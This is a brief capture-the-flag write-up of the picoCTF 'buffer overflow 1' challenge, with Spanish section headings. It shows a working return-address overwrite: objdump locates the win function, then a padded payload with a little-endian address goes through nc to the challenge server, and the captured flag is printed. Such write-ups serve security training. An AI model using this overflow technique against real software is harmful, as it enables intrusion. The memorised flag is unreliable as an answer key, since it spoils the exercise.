# buffer overflow 1
## Descripcion
Control the return addressNow we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/186/vuln).You can view source [here](https://artifacts.picoctf.net/c/186/vuln.c). And connect with it using `nc saturn.picoctf.net 65445`
## Pistas
- Make sure you consider big Endian vs small Endian.
- Changing the address of the return pointer can call different functions.
## Solucion
``
```
┌──(kali㉿kali)-[~/Documents]
└─$ objdump -D vuln -M intel | grep 'win'
080491f6 <win>:
 804922c:       75 2a                   jne    8049258 <win+0x62>
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Documents]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | nc saturn.picoctf.net 65445
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_9cf083f8}    

```


## Bandera
picoCTF{addr3ss3s_ar3_3asy_9cf083f8} 

## Notas adicionales

## Referencias
